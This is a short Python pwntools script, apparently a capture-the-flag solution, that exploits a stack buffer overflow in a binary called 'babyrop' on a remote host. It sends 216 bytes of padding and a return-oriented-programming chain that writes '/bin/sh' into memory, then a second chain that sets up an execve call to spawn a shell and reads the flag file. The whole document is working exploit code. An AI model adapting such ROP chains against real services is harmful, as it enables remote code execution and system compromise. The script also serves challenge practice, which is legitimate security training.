from pwn import *


p = remote("34.141.31.183", 30275)
elf = ELF("babyrop")

pop_rdi = 0x0000000000401313
pop_rsi = 0x0000000000401311
pop_rdx = 0x0000000000401152
add_rax = 0x00000000004012aa

payload = b"A"*216
payload += p64(pop_rdi)
payload += p64(elf.bss() + 0x200)
payload += p64(pop_rsi)
payload += p64(0x8)
payload += p64(0x0)
payload += p64(0x0000000000401106)
payload += p64(0x401157)

p.send(payload)

string = b"/bin/sh"
p.send(string)


payload = b"A"*216
payload += p64(pop_rdi)
payload += p64(elf.bss() + 0x400)
payload += p64(pop_rsi)
payload += p64(0x200)
payload += p64(0x0)
payload += p64(0x0000000000401106)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(elf.bss() + 0x200)
payload += p64(pop_rsi)
payload += p64(0x000000)
payload += p64(0x0)
payload += p64(0x401124)


pause()
p.send(payload)
p.send("A"*0x3b)

sleep(1)
p.send("cat /home/babyrop/flag && echo")
p.interactive()
